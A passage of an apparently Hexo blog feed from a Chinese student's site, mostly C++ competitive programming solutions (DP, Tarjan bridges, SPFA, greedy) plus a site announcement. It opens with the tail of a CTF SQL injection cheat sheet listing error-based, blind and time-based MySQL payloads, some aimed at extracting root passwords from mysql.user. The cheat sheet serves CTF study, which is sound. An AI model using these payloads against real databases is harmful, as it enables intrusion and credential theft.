(语句)),1,62)))a from information_schema.tables group by a)b);</p><p>4.insert into web_ids(host) values((select (1) from mysql.user where 1=1 aNd (SELECT 1 FROM (select count(<em>),concat(floor(rand(0)</em>2),(substring((Select (语句)),1,62)))a from information_schema.tables group by a)b)));<br><strong><br>0x03 mysql一般盲注</strong></p><p>使用ascii</p><p>AND ascii(substring((SELECT password FROM users where id=1),1,1))=49</p><p>使用正则表达式</p><p>and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=”blind_sqli” AND table_name REGEXP ‘^[a-n]’ LIMIT 0,1)</p><p><strong>0x04 mysql时间盲注</strong></p><p>1170 union select if(substring(current,1,1)=char(11),benchmark(5000000,encode(‘msg’,’by 5 seconds’)),null) from (select database() as current) as tbl</p><p>UNION SELECT IF(SUBSTRING(Password,1,1)=’a’,BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sql注入 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>本站公告</title>
      <link href="/2018/10/26/%E6%9C%AC%E7%AB%99%E5%85%AC%E5%91%8A/"/>
      <url>/2018/10/26/%E6%9C%AC%E7%AB%99%E5%85%AC%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="欢迎来到-FFY’s-Blog"><a href="#欢迎来到-FFY’s-Blog" class="headerlink" title="欢迎来到 FFY’s Blog"></a>欢迎来到 FFY’s Blog</h1><p>好像几辈子没有更新 Blog 了,最近有时间就坚持更新下吧</p><p>这是我用 HEXO 搭建在的 github 上的一个 Blog,因此,图片的加载可能有点慢<br>目前,本站的功能还在继续更新<br>如果你有什么好的建议,欢迎在最下方的评论留下你的昵称,邮箱和想法,或者直接<a href="https://ffdy.github.io/about/">联系我</a><br><br><br><br><br>本站的文章都比较水 <del>(好吧,是水的不要不要的)</del> ,请大佬勿喷</p><p>如果你对 HEXO 静态 Blog 感兴趣,请直接联系我,我会尽我所能帮助你</p><h3 id="本站的功能清单"><a href="#本站的功能清单" class="headerlink" title="本站的功能清单:"></a>本站的功能清单:</h3><ul><li>鼠标点击效果</li><li>页面欺骗</li><li>Live2D 宠物</li><li>Markdown</li><li>mathjax 数学公式</li><li>mermaid 图表</li><li>语法高亮</li><li>评论系统</li><li>分享系统</li><li>站内搜索</li><li>文章置顶</li><li>随机图片</li><li>文章标签</li><li>文章分类</li></ul><p>我是疯疯芸,你也可以叫我 FFY,感谢你的来访</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>灯泡</title>
      <link href="/2018/10/23/%E7%81%AF%E6%B3%A1/"/>
      <url>/2018/10/23/%E7%81%AF%E6%B3%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>求$L$最大值</p></blockquote><p><img src="http://acm.zju.edu.cn/onlinejudge/showImage.do?name=light_bulb_1037_ddd01.gif" alt="asdfasdf"></p><blockquote><p><strong>我们设人与灯低的距离为$x$,墙上的部分长$y$,用$x$表示出$L$和$y$,通过均值不等式求解最大值</strong></p></blockquote><pre><code class="lang-cpp">#include&lt;cmath&gt;#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;int t;double H,h,D;double cal(){    double x=sqrt((H-h)*D);//均值不等式成立条件    x=min(x,D);//x右边界    x=max(x,(D*H-D*h)/H);//x左边界    return D+H-x-(H-h)*D/x;}int main(){    scanf(&quot;%d&quot;,&amp;t);    while(t--)    {        scanf(&quot;%lf%lf%lf&quot;,&amp;H,&amp;h,&amp;D);        printf(&quot;%.3lf\n&quot;,cal());    }    return 0;}</code></pre><!--stackedit_data:eyJoaXN0b3J5IjpbLTE5MTM4MzgyMThdfQ==-->]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 均值不等式 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>分块</title>
      <link href="/2018/10/23/%E5%88%86%E5%9D%97/"/>
      <url>/2018/10/23/%E5%88%86%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>$n$个格子，现在要把它分成若干段相邻的块，要求每块不超过$m$个格子。块数不限。求分法总数对$Q$取模的结果。</p></blockquote><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><blockquote><p><strong>首先想到$n^2$ 的做法,我们定义$f[i]$表示划分到$i$时的合法方案的数量,不难想到转移方程:<script type="math/tex">f[i]= \sum_{j=max(0,i-m)}^{i-1}f[j]</script><br>复杂度是$(0)n^2$<br>然而数据范围是$10^6$,我们需要继续优化;<br>观察转移方程我们发现$f[i]$实际上等于一段连续区间的和,我们可以用前缀和来优化DP,这样时间复杂度就降到了$(o)n$,这道题就解决了</strong></p></blockquote><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;#define ll long longusing namespace std;const int maxn=1e6+10;int t,n,m,mod;ll f[maxn],s[maxn];int main(){    scanf(&quot;%d&quot;,&amp;t);    while(t--)    {        scanf(&quot;%d%d%d&quot;,&amp;n,&amp;m,&amp;mod);        memset(f,0,sizeof f);        f[0]=1;s[0]=1;        for(int i=1;i&lt;=n;i++)        {            if(!(i-m))f[i]=s[i-1];            else f[i]=(s[i-1]-s[i-m-1])%mod;//记得取模            s[i]=(s[i-1]+f[i]);//            for(int j=max(0,i-m);j&lt;i;j++)//            f[i]+=f[j];        }        printf(&quot;%lld\n&quot;,f[n]);    }    return 0;}</code></pre><!--stackedit_data:eyJoaXN0b3J5IjpbMTM0ODY2MjYwNV19-->]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线性DP </tag>
            
            <tag> 计数 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>割点和桥学习</title>
      <link href="/2018/10/23/%E5%89%B2%E7%82%B9%E5%92%8C%E6%A1%A5%20%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/10/23/%E5%89%B2%E7%82%B9%E5%92%8C%E6%A1%A5%20%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<hr><p>说实话,tarjan是个好东西<br>然而我却丢了他的脸<br>到现在我还是很迷糊</p><ul><li>注意缩点,割点和割边的不同</li><li>这东西有毒,剧毒<del>mmp</del></li><li>割点</li><li>割边<ul><li>当存在重边时应将记录父亲节点改为记录父亲边</li></ul></li><li>点双联通分量</li><li>边双联通分量<ul><li>可在求割边时同时求出</li></ul></li><li>tarjan</li></ul><pre><code class="lang-cpp">//割边 &amp;&amp; 没有重边#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int maxn=5e3+10;int n,m,head[maxn],num;int dfn[maxn],low[maxn],input;bool use[maxn];struct fy{int to,next;}q[maxn&lt;&lt;2];void add(int a,int b){q[++num]=(fy){b,head[a]};head[a]=num;}void tar(int a,int fa){    dfn[a]=low[a]=++input;    for(int i=head[a];i;i=q[i].next)    {        int b=q[i].to;        if(!dfn[b])        {            tar(b,a);low[a]=min(low[a],low[b]);            if(dfn[a]&lt;low[b])use[i]=true;//感觉这个地方这辈子都不会懂了,太迷幻            //当然可以和割点一起求            /*if((child&gt;1&amp;&amp;root==a)||(root!=a&amp;&amp;dfn[a]&lt;=low[b])cutd[i]=true;*/            //root为根节点        }        else if(b!=fa)low[a]=min(low[a],dfn[b]);        //为什么是b!=fa呢,不懂    }}int main(){    scanf(&quot;%d%d&quot;,&amp;n,&amp;m);int a,b;    for(int i=1;i&lt;=m;i++)    {        scanf(&quot;%d%d&quot;,&amp;a,&amp;b);        add(a,b);add(b,a);    }    for(int i=1;i&lt;=n;i++)if(!dfn[i])tar(i,0);    for(int i=1;i&lt;=num;i++)if(use[i])printf(&quot;%d &quot;,i);    return 0;}</code></pre><p>当有重边时记录父亲<strong>边</strong></p><pre><code class="lang-cpp">//割边&amp;&amp;边双缩点&amp;&amp;有重边&amp;&amp;非边双转边双#include&lt;cstdio&gt;#include&lt;stack&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int maxn=5e3+10;int n,m,head[maxn],num,bi,cnt,ans,fa[maxn],in[maxn];bool use[maxn&lt;&lt;2];int dfn[maxn],low[maxn],input,xx[maxn],w,pa[maxn];struct fy{int from,to,next,h;}q[maxn&lt;&lt;2];//h用来装边void add(int a,int b){    q[++num]=(fy){a,b,head[a],++bi};head[a]=num;    q[++num]=(fy){b,a,head[b],bi};head[b]=num;}void tar(int a){    dfn[a]=low[a]=++input;xx[++w]=a;    for(int i=head[a];i;i=q[i].next)    {        int b=q[i].to;        if(q[i].h==pa[a])continue;//如果该边走过了就不能再走        if(!dfn[b])        {            pa[b]=q[i].h;//记录父亲边            tar(b);low[a]=min(low[a],low[b]);        }        else low[a]=min(low[a],dfn[b]);    }    if(dfn[a]==low[a])//同时边双缩点    {        cnt++;        while(xx[w+1]!=a)        {fa[xx[w]]=cnt;w--;}    }}int main(){    scanf(&quot;%d%d&quot;,&amp;n,&amp;m);int a,b;    for(int i=1;i&lt;=m;i++)    {        scanf(&quot;%d%d&quot;,&amp;a,&amp;b);        add(a,b);    }    tar(1);    for(int i=1;i&lt;=num;i++)    {        a=fa[q[i].from];        b=fa[q[i].to];        if(a!=b)in[b]++;    }    for(int i=1;i&lt;=cnt;i++)if(in[i]==1)ans++;    printf(&quot;%d\n&quot;,(ans+1)/2);    return 0;}</code></pre><!--stackedit_data:eyJoaXN0b3J5IjpbLTExMjM0NDMxMTFdfQ==-->]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 桥 </tag>
            
            <tag> 图论 </tag>
            
            <tag> 割点 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>军训队列</title>
      <link href="/2018/10/23/%E5%86%9B%E8%AE%AD%E9%98%9F%E5%88%97/"/>
      <url>/2018/10/23/%E5%86%9B%E8%AE%AD%E9%98%9F%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><h2 id="gt-有-n-名学生参加军训，军训的一大重要内容就是走队列，而一个队列的不整齐程度是该队中最高的学生的身高与最矮的学生的身高差值的平方-现在要将-n-名参加军训的学生分成-k-个队列，每个队列的人数可以是任意非负整数。在安排队列时希望所有队列的不整齐度之和尽量小，请问不整齐度之和最小可以是多少？"><a href="#gt-有-n-名学生参加军训，军训的一大重要内容就是走队列，而一个队列的不整齐程度是该队中最高的学生的身高与最矮的学生的身高差值的平方-现在要将-n-名参加军训的学生分成-k-个队列，每个队列的人数可以是任意非负整数。在安排队列时希望所有队列的不整齐度之和尽量小，请问不整齐度之和最小可以是多少？" class="headerlink" title="&gt;有 n 名学生参加军训，军训的一大重要内容就是走队列，而一个队列的不整齐程度是该队中最高的学生的身高与最矮的学生的身高差值的平方.现在要将 n 名参加军训的学生分成 k 个队列，每个队列的人数可以是任意非负整数。在安排队列时希望所有队列的不整齐度之和尽量小，请问不整齐度之和最小可以是多少？"></a>&gt;有 n 名学生参加军训，军训的一大重要内容就是走队列，而一个队列的不整齐程度是该队中最高的学生的身高与最矮的学生的身高差值的平方.现在要将 n 名参加军训的学生分成 k 个队列，每个队列的人数可以是任意非负整数。在安排队列时希望所有队列的不整齐度之和尽量小，请问不整齐度之和最小可以是多少？</h2><ul><li>排序</li><li>DP</li></ul><blockquote><p><strong>先将身高排序,问题就转换成将一个区间切成$k$段,求$k$个区间的极值差平方和的最小值<br>对于每一个人,他的决策无非两种,加到上一个区间,或者自立门户,状态转移方程:</strong></p><ol><li><strong>加入上一个区间:</strong> &nbsp;&nbsp;$f[i][j][k]=min(f[i-1][j][k]-v[j][i-1]+v[j][i])$</li><li><strong>自立门户:</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$f[i][i][k]=min(f[i-1][j][k-1])$</li></ol><p><strong>我们可以$n^2$预处理出v数组,时间复杂度为$(o)n^3$<br>但问题又来了,空间复杂度是$n^3+n^2$,可能开不下<br>我们观察到$i$维每次有用的状态只有两位,我们可以用一个滚动数组优化空间,空间复杂度变为$3\times n^2$</strong></p></blockquote><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int maxn=510;int n,m,h[maxn],cnt;int f[2][maxn][maxn];int v[maxn][maxn];int main(){    freopen(&quot;queue.in&quot;,&quot;r&quot;,stdin);    freopen(&quot;queue.out&quot;,&quot;w&quot;,stdout);    scanf(&quot;%d%d&quot;,&amp;n,&amp;m);    for(int i=1;i&lt;=n;i++)scanf(&quot;%d&quot;,&amp;h[i]);    if(n==m)    {        printf(&quot;0\n&quot;);        return 0;    }    sort(h+1,h+1+n);memset(f,0x3f,sizeof f);    for(int i=1;i&lt;=n;i++)for(int j=i;j&lt;=n;j++)    v[i][j]=(h[j]-h[i])*(h[j]-h[i]);    f[0][0][0]=0;    for(int i=1;i&lt;=n;i++)    {        cnt^=1;memset(f[cnt],0x3f,sizeof f[cnt]);        for(int j=0;j&lt;i;j++)        {            for(int k=1;k&lt;=m;k++)            {                f[cnt][i][k]=min(f[cnt][i][k],f[cnt^1][j][k-1]);                f[cnt][j][k]=min(f[cnt][j][k],f[cnt^1][j][k]-v[j][i-1]+v[j][i]);            }        }    }    int ans=1e9+7;    for(int i=1;i&lt;=n;i++)    ans=min(ans,f[cnt][i][m]);    printf(&quot;%d\n&quot;,ans);    return 0;}</code></pre><!--stackedit_data:eyJoaXN0b3J5IjpbMTU3MjAzNjcwMV19-->]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线性DP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>信息技术培训基础知识</title>
      <link href="/2018/10/23/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2018/10/23/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h3 id="一、高精度计算"><a href="#一、高精度计算" class="headerlink" title="一、高精度计算"></a>一、高精度计算</h3><p>（至少掌握加减乘（高精对高精），正数高精度（简化模板）加减乘除（高精度与低精度）  </p><h3 id="二、排序算法"><a href="#二、排序算法" class="headerlink" title="二、排序算法"></a>二、排序算法</h3><p>基本算法（选择排序、插入排序、冒泡排序、快排、堆排、归并排序、计数排序、基数排序。另外练习字符串排序、多关健字排序、排序二叉树）<br>典型应用<br>逆序对、第K小数  </p><h3 id="三、查找算法"><a href="#三、查找算法" class="headerlink" title="三、查找算法"></a>三、查找算法</h3><p>数组映射、顺序查找、二分查找（一般静态）、hash查找（可动态也可静态、编码）  </p><h3 id="四、递归、回溯、深搜"><a href="#四、递归、回溯、深搜" class="headerlink" title="四、递归、回溯、深搜"></a>四、递归、回溯、深搜</h3><p>从相关题目加深理解<br>最大公约数（减法和求余）、排列数的输出、组合数的输出、表达式计算、逆波兰式、连续最大和（递归）、上台阶问题、跳马问题、填数问题、老鼠走迷宫、因式分解、素数环、皇后问题、机器分工、数的划分、任务安排、四色问题、邮票问题、埃及分数、生日蛋糕、八数码问题、路由选择。（迭代思想、剪枝技巧、IDA*、阶乘编码）  </p><h3 id="五、广搜"><a href="#五、广搜" class="headerlink" title="五、广搜"></a>五、广搜</h3><p>魔板问题、跳棋问题、八数码问题、奇怪的电梯、翻硬币问题。（相关的优化，加快判重、双向搜索、IDA*）  </p><h3 id="六、二分"><a href="#六、二分" class="headerlink" title="六、二分"></a>六、二分</h3><p>二分加速、二分查找、二分枚举  </p><h3 id="七、数据结构"><a href="#七、数据结构" class="headerlink" title="七、数据结构"></a>七、数据结构</h3><p>栈（表达式计算）、队列（广搜中常用、单调队列）、链表、双向链表、堆、竞赛树、排序二叉树、树状数组、hash、并查集、KMP算法、RMQ、LCA、回文串问题、trie。（树的线型化应用、深搜序的应用）  </p><h3 id="八、图论"><a href="#八、图论" class="headerlink" title="八、图论"></a>八、图论</h3><p>图的两种遍历方式、图的连通性判别定（深搜索、并查集）、有向图的强连通分量（两次深搜求交法、tarjan)、拓朴排序、关键路、最短路算法（dijk、floyd、bellman、spfa)、最小生成树（prime、Kruskal）二分匹配（最大独立集、最小支配集、最小路径点覆盖问题）（题库上题目较多）欧拉路和欧拉回路、哈密顿回路、关节点、桥  </p><h3 id="九、动态规划"><a href="#九、动态规划" class="headerlink" title="九、动态规划"></a>九、动态规划</h3><p>（重中之重 练习相关基本模型）  </p><h3 id="重要思想："><a href="#重要思想：" class="headerlink" title="重要思想："></a>重要思想：</h3><p>二分、逆向思维<br><!--stackedit_data:eyJoaXN0b3J5IjpbLTg2OTgyMzE1XX0=--></p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>字符串的最小表示</title>
      <link href="/2018/10/23/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%9C%80%E5%B0%8F%E8%A1%A8%E7%A4%BA/"/>
      <url>/2018/10/23/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%9C%80%E5%B0%8F%E8%A1%A8%E7%A4%BA/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>开两个指针,依次对比;<br>当第二个指针比第一个更优时,更新第一个指针为第二个指针,第二个指针+1</strong></p></blockquote><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;algorithm&gt;#include&lt;cstring&gt;using namespace std;const int maxn=3e5+10;int n;char str[maxn];int l,w;int main(){    scanf(&quot;%d&quot;,&amp;n);    while(n--)    {        scanf(&quot;%d%s&quot;,&amp;l,str);        for(int i=0;i&lt;l;i++)        str[i+l]=str[i];        int ll=0,rr=1;        while(ll&lt;l&amp;&amp;rr&lt;l)        {            int i=0;            while(str[ll+i]==str[rr+i]) i++;            if(i&gt;=l) break;            if(str[ll+i]&gt;str[rr+i])             {                if(ll+i+1&gt;rr) ll=ll+i+1;                else ll=rr+1;            }            else if(rr+1+i&gt;ll) rr=rr+i+1;            else rr=ll+1;        }        printf(&quot;%d\n&quot;,min(ll,rr));    }    return 0;}</code></pre><!--stackedit_data:eyJoaXN0b3J5IjpbMTc0ODczOTE1MF19-->]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 字符串 </tag>
            
            <tag> 最小表示法 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Picnic Planning</title>
      <link href="/2018/10/23/Picnic%20Planning/"/>
      <url>/2018/10/23/Picnic%20Planning/</url>
      
        <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>矮人虽小却喜欢乘坐巨大的轿车，车大到能够装下不管多少矮人。某天，N(N≤20)个矮人打算到野外聚餐。为了集中到聚餐地点，矮人A 要么开车到矮人B 家中，留下自己的轿车在矮人B 家，然后乘坐B 的轿车同行；要么直接开车到聚餐地点，并将车停放在聚餐地。尽管矮人的家非常大，能够停放无数量轿车，可是聚餐地点却最多仅仅能停放K 辆轿车。给你一张加权无向图，描写叙述了N 个矮人的家和聚餐地点，求出全部矮人开车最短总路程</p></blockquote><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><blockquote><p><strong>题本身是一道$k$限制生成树裸题,但那东西太迷幻,不会.因为数据规模比较小,暴力能过,所以也没学.这里用的是状压$+Prim$.</strong><br><strong>因为根节点只能连不大于$k$条边,所以我们暴力枚举根节点能连的边的状态,再将剩下的点跑最小生成树,更新最小代价.</strong></p></blockquote><ul><li>用$map$映射每个人的名字</li><li>可能有重边,需要更新两点之间的最短距离</li><li>这里我们用邻接矩阵存边,用$Prim$跑最小生成树,不然时间复杂度过不去</li><li>每次生成树必须加够$N-1$条边后才能更新$ans$</li><li>输出应遵循题目规则</li></ul><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;map&gt;#include&lt;cstring&gt;#include&lt;string&gt;#include&lt;algorithm&gt;using namespace std;const int maxn=430;int n,k,num,cnt;int fa[22],ans,bns;map&lt; string , int &gt;mm;int ss[22][22];struct fy{    int from,to,d;    bool operator&lt;(const fy&amp;a)const{return d&lt;a.d;};}q[maxn];char str[30],str1[30];void add(int a,int b,int c){q[++num]=(fy){a,b,c};}int can(int a){    bns=0;    int he=0,w=1;    while(a)    {        ++w;        if(a&amp;1)        {            he++;fa[w]=1;            if(ss[1][w]==ss[0][0])return 0;            bns+=ss[1][w];        }        a&gt;&gt;=1;    }    if(he&lt;=k)return he;    return 0;}int find(int a){    while(a!=fa[a])a=fa[a]=fa[fa[a]];    return a;}void ku(int x)//披着羊皮的狼(滑稽){    if(!x)return;    for(int i=1;i&lt;=num;i++)    {        if(q[i].from==1||q[i].to==1)continue;        int a=find(q[i].from);        int b=find(q[i].to);        if(a!=b)        {            if(x==(cnt-1))break;            fa[a]=b;            x++;            bns+=q[i].d;            if(bns&gt;ans)return;        }    }    if(x==(cnt-1))ans=min(ans,bns);}int main(){    int t;    scanf(&quot;%d&quot;,&amp;t);    while(t--)    {        mm.clear();cnt=0;num=0;        scanf(&quot;%d&quot;,&amp;n);memset(ss,0x3f,sizeof ss);        mm[&quot;Park&quot;]=++cnt;ans=ss[0][0];        for(int i=1;i&lt;=n;i++)        {            int a,b,c;            scanf(&quot;%s%s%d&quot;,str,str1,&amp;c);            if(!mm[str])mm[str]=++cnt;            if(!mm[str1])mm[str1]=++cnt;            a=mm[str];b=mm[str1];            ss[a][b]=min(ss[a][b],c);            ss[b][a]=ss[a][b];        }        scanf(&quot;%d&quot;,&amp;k);        for(int i=1;i&lt;=cnt;i++)for(int j=i+1;j&lt;=cnt;j++)        if(ss[i][j]&amp;&amp;(ss[i][j]!=ss[0][0]))add(i,j,ss[i][j]);        sort(q+1,q+1+num);        for(int s=0;s&lt;(1&lt;&lt;(cnt-1));s++)//枚举根节点的状态        {            for(int i=1;i&lt;=cnt;i++)fa[i]=i;            ku(can(s));        }        printf(&quot;Total miles driven: %d\n&quot;,ans);//输出    }    return 0;}</code></pre><!--stackedit_data:eyJoaXN0b3J5IjpbLTIwNTg2NDcyMTddfQ==-->]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生成树 </tag>
            
            <tag> 状压 </tag>
            
            <tag> K限制生成树 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>排队接水</title>
      <link href="/2018/10/23/%E6%8E%92%E9%98%9F%E6%8E%A5%E6%B0%B4/"/>
      <url>/2018/10/23/%E6%8E%92%E9%98%9F%E6%8E%A5%E6%B0%B4/</url>
      
        <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>   现在一个水龙头前面有 n 个人需要接水，他们的编号为 1 到 n 的整数。他们每个人有各自接水需要花费的时间，其中编号为 i 的人花费的时间为 Ti。另外每个人有各自的紧急程度，编号为 i 的人紧急程度为 Ei。现在我们需要给所有人排出一个序，使得总不和谐程度最低。我们定义一个人的等待时间为排在他前面的人和这个人花费的时间之和，一个人的不和谐程度为这个人的等待时间乘以这个人的紧急程度，总不和谐程度为所有人的<br>不和谐程度的和。<br>即我们需要求出一个 1 到 n 的排列 faig ，使得 $\sum_{i=1}^n( \sum^n _{j=1} T_{a_j} )$ 最小。</p></blockquote><ul><li>贪心 </li><li>然后没了</li><li>类似<code>国王游戏</code></li></ul><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;#define ll long longusing namespace std;const int maxn=2e5+10;int n,t;ll ans,s;struct fy{    int t,v;double s;    void w(){this-&gt;s=(double)this-&gt;t/(double)this-&gt;v;}    bool operator&lt;(const fy&amp;a)    const{return s&lt;a.s;}}q[maxn];int read(){     int k=0,f=0;char c=getchar();for(;c&lt;&#39;0&#39;||c&gt;&#39;9&#39;;c=getchar())if(c==&#39;-&#39;)f=1;     for(;c&lt;=&#39;9&#39;&amp;&amp;c&gt;=&#39;0&#39;;c=getchar())k=(k&lt;&lt;3)+(k&lt;&lt;1)+c-&#39;0&#39;;return  f?-k:k;}int main(){     freopen(&quot;water.in&quot;,&quot;r&quot;,stdin);     freopen(&quot;water.out&quot;,&quot;w&quot;,stdout);     t=read();     while(t--)     {         n=read();ans=0;s=0;         for(int i=1;i&lt;=n;i++)         {q[i].t=read();q[i].v=read();q[i].w();}         sort(q+1,q+1+n);         for(int i=1;i&lt;=n;i++)         {             s+=q[i].t;             ans+=(ll)s*(ll)q[i].v;        }        printf(&quot;%lld\n&quot;,ans);    }     return 0;}</code></pre><!--stackedit_data:eyJoaXN0b3J5IjpbLTU3NjI5NTQ0Nl19-->]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 贪心 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>AHOI2017初中组 guide</title>
      <link href="/2018/10/23/%5BAHOI2017%E5%88%9D%E4%B8%AD%E7%BB%84%5Dguide/"/>
      <url>/2018/10/23/%5BAHOI2017%E5%88%9D%E4%B8%AD%E7%BB%84%5Dguide/</url>
      
        <content type="html"><![CDATA[<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>对于一张有向图,每条边有两个边权,有两套GPS会分别按两个边权计算所在到终点的最短路,如果你不按其中一套GPS说的路走,就会产生1的抱怨,求从起点到终点的最少抱怨数</p></blockquote><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><blockquote><p>因为每次两套GPS都会判断当前要去的点是否在当前点到终点的最短路上,所以我们可以反向建边,跑出每套GPS从终点到每个点的最短路,然后我们重新建图,依次枚举原图的每条边,将边权赋值为2,如果要去的点在某套GPS的最短路上,边权减一.最后跑一遍最短路就可以得出$ans$</p></blockquote><ul><li>反向建边</li><li>反向SPFA</li><li>边重构</li><li>反向SPFA</li><li>$ans$</li></ul><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;#include&lt;queue&gt;using namespace std;const int maxn=1e5+10;int n,m,head[maxn],num;int dis[maxn],dis1[maxn],di[maxn];bool use[maxn];struct fy{int from,to,d,dd,e,next;}q[maxn*5];void add(int a,int b,int c,int d){    q[++num]=(fy){a,b,c,d,0,head[a]};head[a]=num;}void sp(){    memset(dis,0x3f,sizeof dis);dis[n]=0;    memset(dis1,0x3f,sizeof dis1);dis1[n]=0;    queue&lt;int&gt;qq;qq.push(n);use[n]=true;    while(!qq.empty())    {        int a=qq.front();qq.pop();use[a]=false;        for(int i=head[a];i;i=q[i].next)        {            int b=q[i].to;            if(dis[b]&gt;dis[a]+q[i].d)            {                dis[b]=dis[a]+q[i].d;                if(!use[b]){use[b]=true;qq.push(b);}            }        }    }    qq.push(n);use[n]=true;    while(!qq.empty())    {        int a=qq.front();qq.pop();use[a]=false;        for(int i=head[a];i;i=q[i].next)        {            int b=q[i].to;            if(dis1[b]&gt;dis1[a]+q[i].dd)            {                dis1[b]=dis1[a]+q[i].dd;                if(!use[b]){use[b]=true;qq.push(b);}            }        }    }}void sp1(){    memset(di,0x3f,sizeof di);di[n]=0;    queue&lt;int&gt;qq;qq.push(n);use[n]=true;    while(!qq.empty())    {        int a=qq.front();qq.pop();use[a]=false;        for(int i=head[a];i;i=q[i].next)        {            int b=q[i].to;            if(di[b]&gt;di[a]+q[i].e)            {                di[b]=di[a]+q[i].e;                if(!use[b]){use[b]=true;qq.push(b);}            }        }    }}int main(){    scanf(&quot;%d%d&quot;,&amp;n,&amp;m);int a,b,c,d;    for(int i=1;i&lt;=m;i++)    {        scanf(&quot;%d%d%d%d&quot;,&amp;a,&amp;b,&amp;c,&amp;d);        add(b,a,c,d);    }    sp();//反向SPFA    for(int i=1;i&lt;=num;i++)//边重构    {        d=2;a=q[i].from;b=q[i].to;        if(dis[b]==dis[a]+q[i].d)d--;        if(dis1[b]==dis1[a]+q[i].dd)d--;        q[i].e=d;    }    sp1();    printf(&quot;%d\n&quot;,di[1]);    return 0;}</code></pre><!--stackedit_data:eyJoaXN0b3J5IjpbMTM3NTA2Nzg0NV19-->]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 算法学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 最短路 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「一本通 1.1 例 5」智力大冲浪</title>
      <link href="/2018/10/23/%E6%99%BA%E5%8A%9B%E6%8C%91%E6%88%98/"/>
      <url>/2018/10/23/%E6%99%BA%E5%8A%9B%E6%8C%91%E6%88%98/</url>
      
